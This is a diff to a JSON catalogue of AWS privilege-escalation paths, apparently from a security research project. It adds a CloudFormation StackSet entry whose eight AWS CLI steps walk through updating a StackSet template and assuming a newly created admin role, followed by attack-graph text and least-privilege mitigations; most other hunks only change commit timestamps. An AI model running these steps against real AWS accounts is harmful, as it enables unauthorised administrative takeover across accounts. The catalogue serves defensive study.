+    "description": "A principal with `iam:PassRole` and `cloudformation:UpdateStackSet` can escalate privileges by modifying an existing CloudFormation StackSet that has a privileged execution role. Both permissions are required for this attack - `cloudformation:UpdateStackSet` alone is insufficient because the UpdateStackSet API call requires passing the administration role ARN, which necessitates the `iam:PassRole` permission. CloudFormation StackSets deploy infrastructure across multiple AWS accounts and regions using an execution role in each target account to perform resource creation and modification. When an attacker can update a StackSet's template and pass the required administration role, they can add any AWS resources that the execution role has permissions to create. By adding IAM resources such as roles with elevated permissions and trust policies allowing the attacker to assume them, the attacker leverages the StackSet's execution role privileges to create resources they couldn't create directly. Once the updated template is deployed to stack instances, the attacker can assume the newly created resources to gain administrative access.",
+    "prerequisites": {
+      "admin": [
+        "A CloudFormation StackSet must exist that the principal can update",
+        "The StackSet must have an execution role with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
+        "The StackSet must have at least one stack instance deployed, or the principal must have permission to create stack instances"
+      ],
+      "lateral": [
+        "A CloudFormation StackSet must exist that the principal can update",
+        "The StackSet must have an execution role with elevated permissions to create the desired resources",
+        "The StackSet must have deployed stack instances or the ability to deploy them"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws cloudformation list-stack-sets \\\n  --query 'Summaries[*].{Name:StackSetName,Status:Status}' \\\n  --output table\n",
+          "description": "List available CloudFormation StackSets to identify targets that can be updated"
+        },
+        {
+          "step": 2,
+          "command": "aws cloudformation describe-stack-set \\\n  --stack-set-name TARGET_STACKSET \\\n  --query 'StackSet.{Name:StackSetName,Status:Status,AdminRole:AdministrationRoleARN,ExecRole:ExecutionRoleName}'\n",
+          "description": "Describe the target StackSet to understand its configuration, including the administration role and execution role being used"
+        },
+        {
+          "step": 3,
+          "command": "aws cloudformation describe-stack-set \\\n  --stack-set-name TARGET_STACKSET \\\n  --query 'StackSet.TemplateBody' \\\n  --output text > current-template.yaml\n",
+          "description": "Retrieve the current StackSet template to understand existing resources"
+        },
+        {
+          "step": 4,
+          "command": "# Modify the template to add resources that provide privilege escalation\n# Edit current-template.yaml to add IAM resources or other privileged resources\n# that the execution role has permissions to create\n",
+          "description": "Modify the StackSet template to add resources that provide privilege escalation. Common additions include IAM roles with trust policies allowing you to assume them"
+        },
+        {
+          "step": 5,
+          "command": "aws cloudformation update-stack-set \\\n  --stack-set-name TARGET_STACKSET \\\n  --template-body file://modified-template.yaml \\\n  --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \\\n  --execution-role-name EXECUTION_ROLE_NAME \\\n  --capabilities CAPABILITY_NAMED_IAM\n",
+          "description": "Update the CloudFormation StackSet with the modified template, passing the administration role via iam:PassRole. The StackSet will use the execution role's permissions when updating stack instances"
+        },
+        {
+          "step": 6,
+          "command": "aws cloudformation list-stack-instances \\\n  --stack-set-name TARGET_STACKSET \\\n  --query 'Summaries[*].{Account:Account,Region:Region,Status:Status}'\n",
+          "description": "List the StackSet's stack instances to identify which accounts and regions will receive the updated template"
+        },
+        {
+          "step": 7,
+          "command": "aws cloudformation describe-stack-set-operation \\\n  --stack-set-name TARGET_STACKSET \\\n  --operation-id OPERATION_ID \\\n  --query 'StackSetOperation.Status'\n",
+          "description": "Monitor the StackSet update operation status until it shows SUCCEEDED, indicating the updated resources have been deployed to stack instances"
+        },
+        {
+          "step": 8,
+          "command": "# Use the newly created resources to escalate privileges\n# For example, assume a newly created IAM role:\naws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/CREATED_ROLE \\\n  --role-session-name escalation-session\n",
+          "description": "Leverage the newly created resources to escalate privileges, such as assuming a newly created IAM role with elevated permissions"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `cloudformation:UpdateStackSet` using the principle of least privilege. Use resource-based conditions to limit which StackSets can be updated:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"cloudformation:UpdateStackSet\",\n  \"Resource\": \"arn:aws:cloudformation:*:ACCOUNT_ID:stackset/approved-stacksets/*\"\n}\n```\n\nRestrict `iam:PassRole` permissions to limit which administration roles can be passed to CloudFormation:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/approved-stackset-admin-roles/*\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"cloudformation.amazonaws.com\"\n    }\n  }\n}\n```\n\nImplement least privilege for StackSet execution roles - avoid granting AdministratorAccess unless absolutely necessary. Apply IAM permission boundaries to execution roles to limit what resources they can create:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Deny\",\n    \"Action\": [\n      \"iam:CreateRole\",\n      \"iam:AttachRolePolicy\",\n      \"iam:PutRolePolicy\",\n      \"iam:CreateUser\",\n      \"iam:CreateAccessKey\"\n    ],\n    \"Resource\": \"*\"\n  }]\n}\n```\n\nUse Service Control Policies (SCPs) to prevent StackSet execution roles from creating sensitive resources. Monitor CloudTrail for `UpdateStackSet` and `PassRole` API calls, especially when templates contain IAM resources.\n\nEnable CloudFormation drift detection to identify unauthorized StackSet modifications. Implement change approval workflows for StackSet updates that modify IAM resources or other sensitive resources.\n\nConsider using CloudFormation service-managed StackSets with AWS Organizations, which provide more controlled permission models. Enable MFA requirements for sensitive CloudFormation operations using IAM condition keys like `aws:MultiFactorAuthPresent`.\n\nRegularly audit StackSet execution roles and their permission boundaries to ensure they follow least privilege principles. Use AWS IAM Access Analyzer to identify privilege escalation paths involving CloudFormation StackSets.\n",
+    "limitations": "This path provides administrative access only if the StackSet's execution role has administrative permissions (e.g., AdministratorAccess policy). If the execution role has limited permissions, you gain access limited to whatever resources that role can create. The StackSet must have stack instances deployed (or you must have permission to deploy them) for the updated template to create resources. StackSet operation preferences and stack policies may also limit what modifications can be made.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS IAM Privilege Escalation - Methods and Mitigation (Rhino Security Labs)",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "How to implement the principle of least privilege with CloudFormation StackSets (AWS Security Blog)",
+        "url": "https://aws.amazon.com/blogs/security/how-to-implement-the-principle-of-least-privilege-with-cloudformation-stacksets/"
+      },
+      {
+        "title": "AWS IAM Privilege Escalation Techniques (HackingThe.Cloud)",
+        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+      },
+      {
+        "title": "AWS - Cloudformation Privesc (HackTricks Cloud)",
+        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-cloudformation-privesc/index.html"
+      },
+      {
+        "title": "AWS CloudFormation Service Role Documentation",
+        "url": "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-iam-servicerole.html"
+      },
+      {
+        "title": "Best practices for configuring identity-based policies for least-privilege CloudFormation access",
+        "url": "https://docs.aws.amazon.com/prescriptive-guidance/latest/least-privilege-cloudformation/best-practices-identity-based-policies.html"
+      }
+    ],
+    "relatedPaths": [
+      "cloudformation-001",
+      "cloudformation-002",
+      "cloudformation-003"
+    ],
+    "learningEnvironments": {
+      "pathfinder-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinder-labs",
+        "scenario": "privesc-one-hop/to-admin/iam-passrole-cloudformation-updatestackset",
+        "description": "Deploy Terraform into your own AWS account to practice this attack path"
+      }
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Principal",
+          "type": "principal",
+          "description": "The principal (user or role) with `iam:PassRole` and `cloudformation:UpdateStackSet` permissions. This principal will modify an existing CloudFormation StackSet's template to execute malicious resources using the StackSet's privileged execution role.\n"
+        },
+        {
+          "id": "existing_stackset",
+          "label": "Existing CloudFormation StackSet",
+          "type": "resource",
+          "description": "An existing CloudFormation StackSet that the attacker can update. StackSets deploy infrastructure across multiple AWS accounts and regions using an execution role in each target account. The attacker modifies the StackSet's template to include resources that provide privilege escalation (like IAM roles with trust policies allowing the attacker to assume them).\n"
+        },
+        {
+          "id": "execution_role",
+          "label": "Existing StackSet Execution Role",
+          "type": "resource",
+          "description": "The IAM role in the target account(s) that CloudFormation StackSets uses to create and modify resources. This role must trust cloudformation.amazonaws.com. When the StackSet is updated, the execution role's permissions determine what resources can be created or modified. The execution role exists in each target account where stack instances are deployed.\n"
+        },
+        {
+          "id": "execute_template",
+          "label": "Execute Updated Template",
+          "type": "action",
+          "color": "#99ccff",
+          "description": "CloudFormation StackSets execute the updated template using the execution role's permissions in each target account. The malicious template creates AWS resources that grant the attacker elevated privileges. Common escalation resources include IAM roles with trust policies allowing the starting principal to assume them, IAM users with access keys, Lambda functions that modify IAM, or EC2 instances with User Data scripts.\n\nThe attacker monitors the StackSet operation status until resources are deployed:\n```bash\naws cloudformation describe-stack-set-operation \\\n  --stack-set-name TARGET_STACKSET \\\n  --operation-id OPERATION_ID \\\n  --query 'StackSetOperation.Status'\n```\n"
+        },
+        {
+          "id": "admin_outcome",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "If the execution role has administrative permissions (AdministratorAccess or equivalent), the updated template can create resources that grant the attacker full administrative access to the AWS account(s). For example, the template could create an IAM role with AdministratorAccess and a trust policy allowing the starting principal to assume it, or create an IAM user with admin permissions and access keys.\n"
+        },
+        {
+          "id": "partial_outcome",
+          "label": "Check for Additional Access",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "If the execution role has some elevated permissions but not full admin, the updated template can create resources that grant partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB), Lambda functions with elevated permissions, or IAM resources that enable additional privilege escalation techniques. The attacker gains access through the newly created resources.\n"
+        },
+        {
+          "id": "minimal_outcome",
+          "label": "Minimal Additional Access",
+          "type": "outcome",
+          "color": "#cccccc",
+          "description": "If the execution role only has minimal permissions or no interesting permissions, the updated template cannot create resources that provide meaningful additional access to the attacker. The privilege escalation attempt provides limited value, though even restricted access could be useful for reconnaissance or as part of a multi-step attack chain.\n"
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "existing_stackset",
+          "label": "iam:PassRole + cloudformation:UpdateStackSet",
+          "description": "Update an existing CloudFormation StackSet with a modified template that includes malicious resources. The attacker passes the administration role via `iam:PassRole` (required for StackSet operations) and updates the template to create privilege escalation resources.\n\nFirst, retrieve the current template to understand existing resources:\n```bash\naws cloudformation describe-stack-set \\\n  --stack-set-name TARGET_STACKSET \\\n  --query 'StackSet.TemplateBody' \\\n  --output text > current-template.yaml\n```\n\nThen modify the template to add escalation resources and update the StackSet:\n```bash\naws cloudformation update-stack-set \\\n  --stack-set-name TARGET_STACKSET \\\n  --template-body file://modified-template.yaml \\\n  --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \\\n  --execution-role-name EXECUTION_ROLE_NAME \\\n  --capabilities CAPABILITY_NAMED_IAM\n```\n\nThe `--capabilities CAPABILITY_NAMED_IAM` flag is required when creating IAM resources.\n"
+        },
+        {
+          "from": "existing_stackset",
+          "to": "execution_role",
+          "label": "StackSet uses execution role",
+          "description": "When the StackSet is updated, CloudFormation automatically uses the execution role in each target account to create or modify resources. The execution role's permissions determine what resources can be provisioned by the updated template. The role must trust cloudformation.amazonaws.com to be used by StackSets.\n"
+        },
+        {
+          "from": "execution_role",
+          "to": "execute_template",
+          "label": "CloudFormation provisions resources",
+          "description": "CloudFormation StackSets provision the resources defined in the updated template using the execution role's permissions in each target account. The malicious template creates resources that grant the attacker access to the execution role's privileges. This happens across all stack instances (potentially multiple accounts and regions), multiplying the impact of the attack.\n"
+        },
+        {
+          "from": "execute_template",
+          "to": "admin_outcome",
+          "label": "If execution role has admin permissions",
+          "branch": "A",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent administrative permissions, the updated template successfully creates resources that grant the attacker full administrative access. Common approaches include creating an IAM role with AdministratorAccess and a trust policy allowing the starting principal to assume it, or creating an IAM user with admin permissions and access keys that can be retrieved from stack outputs or an S3 bucket.\n\nExample of assuming a newly created role:\n```bash\naws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/CREATED_ROLE \\\n  --role-session-name escalation-session\n```\n"
+        },
+        {
+          "from": "execute_template",
+          "to": "partial_outcome",
+          "label": "If execution role has some permissions",
+          "branch": "B",
+          "condition": "some_permissions",
+          "description": "If the execution role has elevated but non-administrative permissions, the updated template can create resources that grant partial privilege escalation. The attacker gains access to whatever the execution role can create, which might include Lambda functions with data access, EC2 instances with privileged instance profiles, S3 buckets with sensitive data, or IAM policies that enable additional privilege escalation paths.\n"
+        },
+        {
+          "from": "execute_template",
+          "to": "minimal_outcome",
+          "label": "If execution role has minimal permissions",
+          "branch": "C",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal or non-sensitive permissions, the updated template cannot create resources that provide meaningful additional access. The privilege escalation attempt may not yield significant results. However, the ability to deploy resources across multiple accounts and regions could still be leveraged for reconnaissance or to establish a foothold for future attacks.\n"
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": null,
+      "lastUpdated": null,
+      "contributors": []
+    },
+    "filePath": "data/paths/cloudformation/cloudformation-004.yaml"
   },
   {
     "id": "codebuild-001",
@@ -1428,13 +2138,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -1628,13 +2338,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-30T01:31:23Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-29T21:31:23-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -1834,13 +2544,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-30T01:31:23Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-29T21:31:23-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -2068,13 +2778,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-30T01:31:23Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-29T21:31:23-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -2277,13 +2987,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-11T19:29:07Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -2584,13 +3294,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:30:35Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -2813,13 +3523,13 @@
       }
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -3059,13 +3769,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -3315,13 +4025,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-07T04:00:34Z",
-      "lastUpdated": "2025-11-12T03:30:35Z",
+      "created": "2025-11-06T23:00:34-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -3534,13 +4244,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-05T19:56:13Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-05T14:56:13-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -3781,13 +4491,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-11T01:49:54Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-10T20:49:54-05:00",
+      "lastUpdated": "2025-11-11T22:03:14-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -4015,13 +4725,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-11T01:49:54Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-10T20:49:54-05:00",
+      "lastUpdated": "2025-11-11T22:03:14-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -4267,13 +4977,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-11T01:49:54Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-10T20:49:54-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -4512,13 +5222,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-11T01:49:54Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-10T20:49:54-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -4760,13 +5470,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-11T01:49:54Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-10T20:49:54-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -4972,13 +5682,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -5180,13 +5890,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -5414,13 +6124,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-05T19:56:13Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-05T14:56:13-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -5657,13 +6367,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-05T19:56:13Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-05T14:56:13-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -5907,13 +6617,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-05T19:56:13Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-05T14:56:13-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -6164,13 +6874,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-05T19:56:13Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-05T14:56:13-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -6306,13 +7016,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -6514,13 +7224,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -6717,13 +7427,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -6901,13 +7611,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -7027,13 +7737,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -7211,13 +7921,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -7338,13 +8048,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -7516,13 +8226,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -7643,13 +8353,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -7782,13 +8492,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -7909,13 +8619,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -8093,13 +8803,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -8275,13 +8985,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -8469,13 +9179,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-05T19:56:13Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-05T14:56:13-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -8705,13 +9415,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-07T04:00:34Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-06T23:00:34-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -8954,13 +9664,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-07T04:00:34Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-06T23:00:34-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -9209,13 +9919,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-07T04:00:34Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-06T23:00:34-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
